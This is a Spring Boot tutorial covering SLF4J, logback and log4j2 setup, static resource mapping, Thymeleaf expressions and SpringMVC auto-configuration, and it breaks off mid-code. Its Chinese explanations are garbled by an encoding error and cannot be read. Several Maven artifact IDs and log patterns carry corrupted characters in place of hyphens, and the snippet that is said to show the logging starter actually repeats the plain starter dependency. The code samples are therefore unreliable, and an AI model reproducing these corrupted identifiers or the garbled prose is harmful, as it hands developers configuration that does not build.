åäºä¸ä¸ªæ¥å¿çæ½è±¡å±ï¼é¡¹ç®ä¸­å¼ç¨äºæ¥å¿çæ½è±¡å±ï¼ç¶åå·ä½çæ¥å¿jarå®ç°äºæ½è±¡å±ãä¸æ¬¡å¦ææ´æ°å°±å¯ä»¥ç´æ¥æ¿æ¢å·ä½çå®ç°å°±å¥½äºã\n\nä¸»æµçæ¥å¿æ¡æ¶ï¼JULãJCLãJboss-loggingãlogbackãlog4jãlog4j2ãslf4jâ¦â¦\n\nä½æ¯è¿äºæ¡æ¶å¹¶ä¸é½æ¯æ¥å¿çå·ä½å®ç°ã\n\næ¥å¿é¨é¢ ï¼æ¥å¿çæ½è±¡å±ï¼                                                  æ¥å¿å®ç°\nJCLï¼Jakarta Commons Loggingï¼ãSLF4jï¼Simple Logging Facade for   Log4j ãJULï¼java.util.loggingï¼ ãLog4j2 ãLogback\nJavaï¼ ãjboss-logging\n\næä»¬å¨é¡¹ç®ä¸­æå¥½æ¯ä½¿ç¨æ¥å¿çæ½è±¡å±ï¼ç¶åéæ©ä¸ä¸ªå·ä½çå®ç°ãè¿æ ·å¨åæ¢æ¥å¿æ¡æ¶æ¶å°±åªéè¦æ¿æ¢ææ¥å¿çå·ä½å®ç°å°±å¥½äºãå¶ä¸­log4jãlogbackåslf4jæ¯åä¸ä¸ªä½èç åçãslf4jæ¯æ½è±¡å±ï¼é¨é¢ï¼,logbackæ¯log4jçåè½åçº§çã\n\nspringbooté»è®¤éç¨çæ¥å¿æ¡æ¶æ¯slf4jålogbackçç»åï¼èspringé»è®¤ä½¿ç¨çæ¯JCLã\n\n\n# SLF4Jçä½¿ç¨æ¹æ³\n\nSLF4Jå®ç½\n\nä»¥åå¼åçæ¶åï¼æ¥å¿è®°å½æ¹æ³çè°ç¨ä¸åºè¯¥æ¥ç´æ¥è°ç¨æ¥å¿çå®ç°ç±»ï¼èæ¯è°ç¨æ¥å¿æ½è±¡å±éé¢çæ¹æ³ãå¹¶ä¸ç»ç³»ç»éé¢å¯¼å¥slf4jçjarå logbackçå®ç°jarã\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\npublic class HelloWorld {\n    public static void main(String[] args) {\n        Logger logger = LoggerFactory.getLogger(HelloWorld.class);\n        logger.info("Hello World");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\næ¯ä¸ä¸ªæ¥å¿çå®ç°æ¡æ¶é½æèªå·±çéç½®æä»¶ãä½¿ç¨slf4jä»¥åï¼éç½®æä»¶è¿æ¯åææ¥å¿å®ç°æ¡æ¶èªå·±æ¬èº«çéç½®æä»¶ã\n\n\n# æ¥å¿çç»ä¸\n\nå¨é¡¹ç®ä¸­ï¼ä¸åçç»ä»¶å¯è½ä½¿ç¨çä¸åçæ¥å¿æ¡æ¶ãé£ä¹æä»¬æä¹ä½¿ç¨ç»ä¸çlog4jæ¡æ¶å¢ï¼\n\n\n\næä»¬éè¦å°ææçæ¥å¿æ¡æ¶é½ç»ç»ä¸å°slf4j+logbackçç»åï¼\n\n 1. å»é¤ä¹åé¡¹ç®ä¸­çæ¥å¿æ¡æ¶\n 2. æ·»å xxx-over-slf4j.jarï¼è¿ä¸ªjarååé¨çååæ¯åæ¥çæ¥å¿æ¡æ¶ï¼å·ä½å®ç°æ¯è°ç¨slf4jçapiï¼ç¶ååç±slf4jè°ç¨å·ä½çæ¥å¿å®ç°æ¡æ¶ã\n 3. å¯¼å¥slf4jçå¶ä»å®ç°ã\n\n\n# springbootçæ¥å¿å³ç³»\n\næ¯ä¸ªspringbootåºæ¯å¯å¨å¨ä¸­é½ä¼åå«ä¸ä¸ªspringbootçå¯å¨å¨ã\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarter</artifactId>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\nè¯¥å¯å¨å¨ä¸­ååå«äºä¸ä¸ªæ¥å¿çå¯å¨å¨\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarter</artifactId>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\nåºå±çä¾èµå³ç³»ï¼\n\n\n\nå¦æéè¦å¼å¥å¶ä»æ¡æ¶ï¼é¦åå°±éè¦å°è¯¥æ¡æ¶çæ¥å¿åæé¤åºå»ï¼ç¶åä½¿ç¨xxx-over-slf4j.jarï¼ç»ä¸å°slf4jä¸ã\n\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>springâcore</artifactId>\n    <exclusions>\n        <exclusion>\n            <groupId>commonsâlogging</groupId>\n            <artifactId>commonsâlogging</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# æ¥å¿çä½¿ç¨æ¹æ³\n\n//è®°å½å¨\nLogger logger = LoggerFactory.getLogger(getClass());\n@Test\npublic void contextLoads() {\n    //System.out.println();\n    //æ¥å¿ççº§å«ï¼\n    //ç±ä½å°é« trace<debug<info<warn<error\n    //å¯ä»¥è°æ´è¾åºçæ¥å¿çº§å«ï¼æ¥å¿å°±åªä¼å¨è¿ä¸ªçº§å«ä»¥ä»¥åçé«çº§å«çæ\n    logger.trace("è¿æ¯traceæ¥å¿...");\n    logger.debug("è¿æ¯debugæ¥å¿...");\n    //SpringBooté»è®¤ç»æä»¬ä½¿ç¨çæ¯infoçº§å«çï¼æ²¡ææå®çº§å«çå°±ç¨SpringBooté»è®¤è§å®ççº§å«ï¼root\n    çº§å«\n        logger.info("è¿æ¯infoæ¥å¿...");\n    logger.warn("è¿æ¯warnæ¥å¿...");\n    logger.error("è¿æ¯erroræ¥å¿...");\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\næ¥å¿è¾åºçæ ¼å¼è®¾ç½®ï¼\n\næ¥å¿è¾åºæ ¼å¼ï¼\n%dè¡¨ç¤ºæ¥ææ¶é´ï¼\n%threadè¡¨ç¤ºçº¿ç¨åï¼\n%â5levelï¼çº§å«ä»å·¦æ¾ç¤º5ä¸ªå­ç¬¦å®½åº¦\n%logger{50} è¡¨ç¤ºloggeråå­æé¿50ä¸ªå­ç¬¦ï¼å¦åæç§å¥ç¹åå²ã\n%msgï¼æ¥å¿æ¶æ¯ï¼\n%næ¯æ¢è¡ç¬¦\n%d{yyyyâMMâdd HH:mm:ss.SSS} [%thread] %â5level %logger{50} â %msg%n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nSpringbootä¿®æ¹éç½®æä»¶ä¿®æ¹æ¥å¿ï¼\n\nlogging.level.com.atguigu=trace\n#logging.path=\n# ä¸æå®è·¯å¾å¨å½åé¡¹ç®ä¸çæspringboot.logæ¥å¿\n# å¯ä»¥æå®å®æ´çè·¯å¾ï¼\n#logging.file=G:/springboot.log\n# å¨å½åç£ççæ ¹è·¯å¾ä¸åå»ºspringæä»¶å¤¹åéé¢çlogæä»¶å¤¹ï¼ä½¿ç¨ spring.log ä½ä¸ºé»è®¤æä»¶\nlogging.path=/spring/log\n# å¨æ§å¶å°è¾åºçæ¥å¿çæ ¼å¼\nlogging.pattern.console=%d{yyyyâMMâdd} [%thread] %â5level %logger{50} â %msg%n\n# æå®æä»¶ä¸­æ¥å¿è¾åºçæ ¼å¼\nlogging.pattern.file=%d{yyyyâMMâdd} === [%thread] === %â5level === %logger{50} ==== %msg%n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nLOGGING.FILE   LOGGING.PATH   EXAMPLE    DESCRIPTION\n(none)         (none)                    åªå¨æ§å¶å°è¾åº\næå®æä»¶å          (none)         my.log     è¾åºæ¥å¿å°my.logæä»¶\n(none)         æå®ç®å½           /var/log   è¾åºå°æå®ç®å½ç spring.log æä»¶ä¸­\n\n\n# æ¥å¿éç½®æä»¶\n\nç»ç±»è·¯å¾ä¸æ¾ä¸æ¯ä¸ªæ¥å¿æ¡æ¶èªå·±çéç½®æä»¶ï¼SpringBootå°±ä¸ä½¿ç¨ä»é»è®¤éç½®ã\n\nLOGGING SYSTEM            CUSTOMIZATION\nLogback                   logback-spring.xml , logback-spring.groovy , logback.xml or\n                          logback.groovy\nLog4j2                    log4j2-spring.xml or log4j2.xml\nJDK (Java Util Logging)   logging.properties\n\nå¶ä¸­ï¼å¯ä»¥ä½¿ç¨logback-spring.xmléç½®æä»¶ï¼è¯¥éç½®æä»¶å¯ä»¥æ ¹æ®ç¯å¢profileï¼éæ©ä¸åçéç½®ãè¯¥éç½®æä»¶ä¼è¢«springbootè¯å«ï¼èlogback.xmlå°ä¼è¢«logbackç»ä»¶ç´æ¥è¯å«ï¼å¶ä¸­ä¸è½ç¼åç¸å³çå¶ä»éç½®ã\n\n<springProfile name="staging">\n    <!ââ configuration to be enabled when the "staging" profile is active ââ>\n    å¯ä»¥æå®ææ®µéç½®åªå¨æä¸ªç¯å¢ä¸çæ\n</springProfile>\n\n<appender name="stdout" class="ch.qos.logback.core.ConsoleAppender">\n    <!ââ\n    æ¥å¿è¾åºæ ¼å¼ï¼\n    %dè¡¨ç¤ºæ¥ææ¶é´ï¼\n    %threadè¡¨ç¤ºçº¿ç¨åï¼\n    %â5levelï¼çº§å«ä»å·¦æ¾ç¤º5ä¸ªå­ç¬¦å®½åº¦\n    %logger{50} è¡¨ç¤ºloggeråå­æé¿50ä¸ªå­ç¬¦ï¼å¦åæç§å¥ç¹åå²ã\n    %msgï¼æ¥å¿æ¶æ¯ï¼\n    %næ¯æ¢è¡ç¬¦\n    ââ>\n    <layout class="ch.qos.logback.classic.PatternLayout">\n        <springProfile name="dev">\n            <pattern>%d{yyyyâMMâdd HH:mm:ss.SSS} ââââ> [%thread] âââ> %â5level\n                %logger{50} â %msg%n</pattern>\n        </springProfile>\n        <springProfile name="!dev">\n            <pattern>%d{yyyyâMMâdd HH:mm:ss.SSS} ==== [%thread] ==== %â5level\n                %logger{50} â %msg%n</pattern>\n        </springProfile>\n    </layout>\n</appender>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# åæ¢æ¥å¿æ¡æ¶ä¸ºslf4j+log4j\n\né¦åå°logbackæé¤ï¼ç¶åå°log4j-over-slf4jæé¤ï¼å¼å¥slf4j-log4j12\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarterâweb</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>logbackâclassic</artifactId>\n            <groupId>ch.qos.logback</groupId>\n        </exclusion>\n        <exclusion>\n            <artifactId>log4jâoverâslf4j</artifactId>\n            <groupId>org.slf4j</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupId>org.slf4j</groupId>\n    <artifactId>slf4jâlog4j12</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè¿ä¹åæ²¡æä»ä¹æä¹ï¼å ä¸ºlogbackæ¯log4jçåçº§çæ¬ï¼éå¸¸æåµä¸ï¼æä»¬ä¼ä½¿ç¨log4j2ã\n\n\n# åæ¢æ¥å¿æ¡æ¶slf4j+log4j2\n\né¦åå°starter-loggingæé¤ï¼ä½¿ç¨starter-log4j2\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarterâweb</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>springâbootâstarterâlogging</artifactId>\n            <groupId>org.springframework.boot</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarterâlog4j2</artifactId>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# Webå¼å\n\nä½¿ç¨Springbootè¿è¡webå¼åçæµç¨ï¼\n\n 1. åå»ºSpringbootåºç¨ï¼å¹¶éæ©ç¸å³çç»ä»¶\n 2. ç¼åå°éçéç½®æä»¶\n 3. ç¼åä¸å¡ä»£ç \n\n\n# Springbootå¯¹éæèµæºçå¤ç\n\nSpringbootå¯¹éæèµæºçèªå¨éç½®ç¸å³åæ°å¨ä¸é¢è¿ä¸ªç±»éé¢å®æçã\n\n@ConfigurationProperties(prefix = "spring.resources", ignoreUnknownFields = false)\npublic class ResourceProperties implements ResourceLoaderAware {\n//å¯ä»¥è®¾ç½®åéæèµæºæå³çåæ°ï¼ç¼å­æ¶é´ç­\n\n\n1\n2\n3\n\n\nSpringMVCç¸å³çèªå¨éç½®é½ä¼éç½®å°WebMvcAutoConfigurationä¸­ï¼ä¸é¢çåå®¹æ¯å¯¼å¥webjarså¯¼å¥éæèµæºçæ¹å¼ï¼\n\n@Override\npublic void addResourceHandlers(ResourceHandlerRegistry registry) {\n    if (!this.resourceProperties.isAddMappings()) {\n        logger.debug("Default resource handling disabled");\n        return;\n    }\n    Integer cachePeriod = this.resourceProperties.getCachePeriod();\n    if (!registry.hasMappingForPattern("/webjars/**")) {\n        customizeResourceHandlerRegistration(\n            registry.addResourceHandler("/webjars/**")\n            .addResourceLocations(\n                "classpath:/META-INF/resources/webjars/")\n            .setCachePeriod(cachePeriod));\n    }\n    String staticPathPattern = this.mvcProperties.getStaticPathPattern();\n    if (!registry.hasMappingForPattern(staticPathPattern)) {\n        customizeResourceHandlerRegistration(\n            registry.addResourceHandler(staticPathPattern)\n            .addResourceLocations(\n                this.resourceProperties.getStaticLocations())\n            .setCachePeriod(cachePeriod));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néè¿webjarsæä»¬å¯ä»¥ä½¿ç¨jaråçæ¹å¼å°éæèµæºå¼å¥é¡¹ç®ä¸­ãå¯¹äºè¯·æ±ä¸­/webjarsä¸çä»»æè¯·æ±é½å»classpath:/META-INF/resources/webjars/è¿ä¸ªè·¯å¾å»å¯»æ¾ã\n\nString staticPathPattern = this.mvcProperties.getStaticPathPattern();\n\n\n1\n\n\nè¿è¡ä»£ç è·åäº/**çè·¯å¾ï¼è®¿é®å½åé¡¹ç®çææèµæºå¦ææ²¡äººå¤çï¼é»è®¤ä»resourcePropertiesä¸­è·åéæè·¯å¾ï¼éç½®çéæè·¯å¾æ¯ï¼\n\n\tprivate static final String[] CLASSPATH_RESOURCE_LOCATIONS = {\n\t\t\t"classpath:/META-INF/resources/", "classpath:/resources/",\n\t\t\t"classpath:/static/", "classpath:/public/" };\n\n\tprivate static final String[] RESOURCE_LOCATIONS;\n\n\tstatic {\n\t\tRESOURCE_LOCATIONS = new String[CLASSPATH_RESOURCE_LOCATIONS.length\n\t\t\t\t+ SERVLET_RESOURCE_LOCATIONS.length];\n\t\tSystem.arraycopy(SERVLET_RESOURCE_LOCATIONS, 0, RESOURCE_LOCATIONS, 0,\n\t\t\t\tSERVLET_RESOURCE_LOCATIONS.length);\n\t\tSystem.arraycopy(CLASSPATH_RESOURCE_LOCATIONS, 0, RESOURCE_LOCATIONS,\n\t\t\t\tSERVLET_RESOURCE_LOCATIONS.length, CLASSPATH_RESOURCE_LOCATIONS.length);\n\t}\n\n\t/**\n\t * Locations of static resources. Defaults to classpath:[/META-INF/resources/,\n\t * /resources/, /static/, /public/] plus context:/ (the root of the servlet context).\n\t */\n\tprivate String[] staticLocations = RESOURCE_LOCATIONS;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nå æ­¤ï¼å¯¹äº/**çè®¿é®è·¯å¾ï¼å¦ææ²¡æäººå¤çå°±è®¿é®ä¸é¢çå ä¸ªè·¯å¾å¯»æ¾èµæº:\n\n"classpath:/META-INF/resources/"\n"classpath:/resources/",\n"classpath:/static/"\n"classpath:/public/" \n\n\n1\n2\n3\n4\n\n\nå¯¹äºæ¬¢è¿é¡µçè®¿é®æ å°ï¼æ å°å°æ¯ä¸ªéæèµæºæä»¶å¤¹ä¸­çææindex.htmlã\n\n@Bean\npublic WelcomePageHandlerMapping welcomePageHandlerMapping(\n    ResourceProperties resourceProperties) {\n    return new WelcomePageHandlerMapping(resourceProperties.getWelcomePage(),\n                                         this.mvcProperties.getStaticPathPattern());  //private String staticPathPattern = "/**";\n}\n\nprivate String[] getStaticWelcomePageLocations() {\n    String[] result = new String[this.staticLocations.length];\n    for (int i = 0; i < result.length; i++) {\n        String location = this.staticLocations[i];\n        if (!location.endsWith("/")) {\n            location = location + "/";\n        }\n        result[i] = location + "index.html";\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nå¯¹äºå¾æ çæ å°\n\n@Configuration\n@ConditionalOnProperty(value = "spring.mvc.favicon.enabled", matchIfMissing = true)\npublic static class FaviconConfiguration {\n\n    private final ResourceProperties resourceProperties;\n\n    public FaviconConfiguration(ResourceProperties resourceProperties) {\n        this.resourceProperties = resourceProperties;\n    }\n\n    @Bean\n    public SimpleUrlHandlerMapping faviconHandlerMapping() {\n        SimpleUrlHandlerMapping mapping = new SimpleUrlHandlerMapping();\n        mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + 1);\n        mapping.setUrlMap(Collections.singletonMap("**/favicon.ico",     // è¿æ¯å¨éæèµæºæä»¶å¤¹ä¸å¯»æ¾\n                                                   faviconRequestHandler()));\n        return mapping;\n    }\n\n\n    List<Resource> getFaviconLocations() {\n        List<Resource> locations = new ArrayList<Resource>(\n            this.staticLocations.length + 1);\n        if (this.resourceLoader != null) {\n            for (String location : this.staticLocations) {\n                locations.add(this.resourceLoader.getResource(location));\n            }\n        }\n        locations.add(new ClassPathResource("/"));\n        return Collections.unmodifiableList(locations);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# Thymeleafæ¨¡æ¿å¼æ\n\nSpringbootæ¯ä»¥Jarçæ¹å¼æåï¼å¹¶ä¸åµå¥å¼çtomcatå¹¶ä¸æ¯æjspï¼springbootæ¨èä½¿ç¨thymeleafæ¨¡æ¿å¼æè¿è¡å¼åã\n\n\n\nå¼å¥thymeleafæ¨¡æ¿å¼æçæ¹æ³\n\n<properties>\n    <thymeleaf.version>3.0.9.RELEASE</thymeleaf.version>\n    \x3c!-- å¸å±åè½çæ¯æç¨åº thymeleaf3ä¸»ç¨åº layout2ä»¥ä¸çæ¬ --\x3e\n    \x3c!-- thymeleaf2 layout1 --\x3e\n    <thymeleaf-layout-dialect.version>2.2.2</thymeleaf-layout-dialect.version>\n</properties>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-thymeleaf</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nThymeleafçèªå¨éç½®ï¼é»è®¤å¸®æä»¬æ·»å äºæ¨¡æ¿è§£æå¨ç­ç»ä»¶ï¼èé»è®¤è§åéç½®å¨ThymeleafPropertiesä¸­\n\n@ConfigurationProperties(prefix = "spring.thymeleaf")\npublic class ThymeleafProperties {\n\n    private static final Charset DEFAULT_ENCODING = Charset.forName("UTF-8");\n\n    private static final MimeType DEFAULT_CONTENT_TYPE = MimeType.valueOf("text/html");\n\n    public static final String DEFAULT_PREFIX = "classpath:/templates/";\n\n    public static final String DEFAULT_SUFFIX = ".html";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ ¹æ®ä»¥ä¸çéç½®ï¼åªéè¦å°æä»¬çthymeleafæ¨¡æ¿æ¾ç½®å°classpath:/templates/ä¸­ï¼å¹¶ä»¥htmlç»å°¾ï¼å°±å¯ä»¥è¢«Thymeleafæ¨¡æ¿å¼æè§£æã\n\n# ä½¿ç¨æ¹æ³\n\n 1. å¯¼å¥thymeleafåç§°ç©ºé´\n\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n\n\n1\n\n\n 2. Thymeleafè¯­æ³ï¼åèææ¡£ä¸è½½\n\n 3. æ ç­¾\n\n\n\n 4. è¡¨è¾¾å¼\n\nç®åè¡¨è¾¾å¼ï¼\nåéè¡¨è¾¾å¼ ${...}ï¼è·ååéå¼ï¼OGNLï¼\n\t1ï¼ãè·åå¯¹è±¡çå±æ§ãè°ç¨æ¹æ³\n\t2ï¼ãä½¿ç¨åç½®çåºæ¬å¯¹è±¡ï¼\n\t#ctx : the context object.\n    #vars: the context variables.\n    #locale : the context locale.\n    #request : (only in Web Contexts) the HttpServletRequest object.\n    #response : (only in Web Contexts) the HttpServletResponse object.\n    #session : (only in Web Contexts) the HttpSession object.\n    #servletContext : (only in Web Contexts) the ServletContext object.\n    ${session.foo}\nåç½®çä¸äºå·¥å·å¯¹è±¡ï¼\n    #execInfo : information about the template being processed.\n    #messages : methods for obtaining externalized messages inside variables expressions, in the\n    same way as they would be obtained using #{â¦} syntax.\n    #uris : methods for escaping parts of URLs/URIs\n    #conversions : methods for executing the configured conversion service (if any).\n    #dates : methods for java.util.Date objects: formatting, component extraction, etc.\n    #calendars : analogous to #dates , but for java.util.Calendar objects.\n    #numbers : methods for formatting numeric objects.\n    #strings : methods for String objects: contains, startsWith, prepending/appending, etc.\n    #objects : methods for objects in general.\n    #bools : methods for boolean evaluation.\n    #arrays : methods for arrays.\n    #lists : methods for lists.\n    #sets : methods for sets.\n    #maps : methods for maps.\n    #aggregates : methods for creating aggregates on arrays or collections.\n    #ids : methods for dealing with id attributes that might be repeated (for example, as a\n    result of an iteration).\néæ©åéè¡¨è¾¾å¼ *{...}ï¼éæ©è¡¨è¾¾å¼ï¼å${}å¨åè½ä¸æ¯ä¸æ ·\n\tè¡¥åï¼éå th:object="${session.user}ï¼\n    &lt;div th:object="${session.user}">\n    &lt;p>Name: &lt;span th:text="*{firstName}">Sebastian&lt;/span>.&lt;/p>\n    &lt;p>Surname: &lt;span th:text="*{lastName}">Pepper&lt;/span>.&lt;/p>\n    &lt;p>Nationality: &lt;span th:text="*{nationality}">Saturn&lt;/span>.&lt;/p>\n    &lt;/div>\nMessage Expressions: #{...}ï¼è·åå½éååå®¹\nLink URL Expressions: @{...}ï¼å®ä¹URLï¼\n\t@{/order/process(execId=${execId},execType=\'FAST\')}\nFragment Expressions: ~{...}ï¼çæ®µå¼ç¨è¡¨è¾¾å¼\n\t&lt;div th:insert="~{commons :: main}">...&lt;/div>\nLiteralsï¼å­é¢éï¼\n    Text literals: \'one text\' , \'Another one!\' ,â¦\n    Number literals: 0 , 34 , 3.0 , 12.3 ,â¦\n    Boolean literals: true , false\n    Null literal: null\n    Literal tokens: one , sometext , main ,â¦\nText operations:ï¼ææ¬æä½ï¼\n    String concatenation: +\n    Literal substitutions: |The name is ${name}|\nArithmetic operations:ï¼æ°å­¦è¿ç®ï¼\n    Binary operators: + , â , * , / , %\n    Minus sign (unary operator): â\n    Boolean operations:ï¼å¸å°è¿ç®ï¼\n    Binary operators: and , or\n    Boolean negation (unary operator): ! , not\n    Comparisons and equality:ï¼æ¯è¾è¿ç®ï¼\n    Comparators: > , &lt; , >= , &lt;= ( gt , lt , ge , le )\n    Equality operators: == , != ( eq , ne )\n    Conditional operators:æ¡ä»¶è¿ç®ï¼ä¸åè¿ç®ç¬¦ï¼\n    Ifâthen: (if) ? (then)\n    Ifâthenâelse: (if) ? (then) : (else)\n    Default: (value) ?: (defaultvalue)\nSpecial tokens:\n\tNoâOperation: _\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n\n# SpringMVCèªå¨éç½®\n\nSpringbootå¸®æä»¬å®æäºSpringmvcçèªå¨éç½®ï¼å®ä¹å¨WebMvcAutoConfigurationä¸­ã\n\nSpring Boot provides auto-configuration for Spring MVC that works well with most applications.\n\nThe auto-configuration adds the following features on top of Springâs defaults:\n\n * Inclusion of ContentNegotiatingViewResolver and BeanNameViewResolver beans.\n   \n   * èªå¨éç½®äºViewResolverï¼è§å¾è§£æå¨ï¼æ ¹æ®æ¹æ³çè¿åå¼å¾å°è§å¾å¯¹è±¡ï¼Viewï¼ï¼è§å¾å¯¹è±¡å³å®å¦ä½æ¸²æï¼\n   * ContentNegotiatingViewResolverï¼ç¨äºç»åææçè§å¾è§£æå¨\n   * æä»¬å¯ä»¥èªå·±ç»å®¹å¨ä¸­æ·»å ä¸ä¸ªè§å¾è§£æå¨ï¼ä¼èªå¨å°å¶ç»åè¿æ¥ã\n\n * Support for serving static resources, including support for WebJars (see below).\n\n * Automatic registration of Converter, GenericConverter, Formatter beans.\n   \n   * Converterï¼è½¬æ¢å¨ï¼ public String hello(User user)ï¼ç±»åè½¬æ¢ä½¿ç¨Converter\n   * Formatter æ ¼å¼åå¨ï¼ 2017.12.17==>Date\n\n * Support for HttpMessageConverters (see below).\n   \n   * HttpMessageConverterï¼SpringMVCç¨æ¥è½¬æ¢Httpè¯·æ±åååºçï¼User---Json\n   * HttpMessageConverters æ¯ä»å®¹å¨ä¸­ç¡®å®ï¼è·åææçHttpMessageConverter.\n   * èªå·±ç»å®¹å¨ä¸­æ·»å HttpMessageConverterï¼åªéè¦å°èªå·±çç»ä»¶æ³¨åå®¹å¨ä¸­ ï¼@Bean,@Componentï¼\n\n * Automatic registration of MessageCodesResolver (see below).\n   \n   * å®ä¹éè¯¯ä»£ç çæè§å\n\n * Static index.html support.\n\n * Custom Favicon support (see below).\n\n * Automatic use of a ConfigurableWebBindingInitializer bean (see below).\n   \n   * æä»¬å¯ä»¥éç½®ä¸ä¸ªConfigurableWebBindingInitializeræ¥æ¿æ¢é»è®¤çãï¼æ·»å å°å®¹å¨ï¼\n\nIf you want to keep Spring Boot MVC features, and you just want to add additional MVC configuration (interceptors, formatters, view controllers etc.) you can add your own @Configuration class of type WebMvcConfigurerAdapter, but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter or ExceptionHandlerExceptionResolver you can declare a WebMvcRegistrationsAdapter instance providing such components.\n\nIf you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc.\n\nå¦ææä»¬æ³è¦æå±SpringMVCç¸å³éç½®ï¼å¦æ¦æªå¨ï¼èµæºæ å°ç­ï¼\n\n<mvc:viewâcontroller path="/hello" viewâname="success"/>\n<mvc:interceptors>\n    <mvc:interceptor>\n        <mvc:mapping path="/hello"/>\n        <bean></bean>\n    </mvc:interceptor>\n</mvc:interceptors>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næä»¬å°±éè¦ç¼åä¸ä¸ªéç½®ç±»ï¼ç»§æ¿WebMvcConfigurerAdapterã\n\n//ä½¿ç¨WebMvcConfigurerAdapterå¯ä»¥æ¥æ©å±SpringMVCçåè½\n@Configuration\npublic class MyMvcConfig extends WebMvcConfigurerAdapter {\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        // super.addViewControllers(registry);\n        //æµè§å¨åé /atguigu è¯·æ±æ¥å° success\n        registry.addViewController("/atguigu").setViewName("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nåå ï¼\n\n 1. WebMvcAutoConfigurationæ¯SpringMVCçèªå¨éç½®ç±»\n 2. å¨åå¶ä»èªå¨éç½®æ¶ä¼å¯¼å¥@Import(EnableWebMvcConfiguration.class)\n 3. å®¹å¨ä¸­ææçWebMvcConfigureré½ä¼ä¸èµ·èµ·ä½ç¨ï¼æä»¬èªå·±ç¼åçä¹ä¼è¢«è°ç¨\n\n@Configuration\npublic static class EnableWebMvcConfiguration extends DelegatingWebMvcConfiguration {\n    private final WebMvcConfigurerComposite configurers = new WebMvcConfigurerComposite();\n    //ä»å®¹å¨ä¸­è·åææçWebMvcConfigurer\n    @Autowired(required = false)\n    public void setConfigurers(List<WebMvcConfigurer> configurers) {\n        if (!CollectionUtils.isEmpty(configurers)) {\n            this.configurers.addWebMvcConfigurers(configurers);\n            //ä¸ä¸ªåèå®ç°ï¼å°ææçWebMvcConfigurerç¸å³éç½®é½æ¥ä¸èµ·è°ç¨ï¼\n            @Override\n            // public void addViewControllers(ViewControllerRegistry registry) {\n            // for (WebMvcConfigurer delegate : this.delegates) {\n            // delegate.addViewControllers(registry);\n            // }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nå¨é¢æ¥ç®¡SpringMVC\n\nå½æä»¬æ³è¦éç½®SPringMVCçææç»èæ¶ï¼å¯ä»¥ä½¿ç¨@EnableWebMvcæ³¨è§£ï¼æ æ³¨å°éç½®ç±»ä¸ã\n\n//ä½¿ç¨WebMvcConfigurerAdapterå¯ä»¥æ¥æ©å±SpringMVCçåè½\n@EnableWebMvc\n@Configuration\npublic class MyMvcConfig extends WebMvcConfigurerAdapter {\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        // super.addViewControllers(registry);\n        //æµè§å¨åé /atguigu è¯·æ±æ¥å° success\n        registry.addViewController("/atguigu").setViewName("success");\n    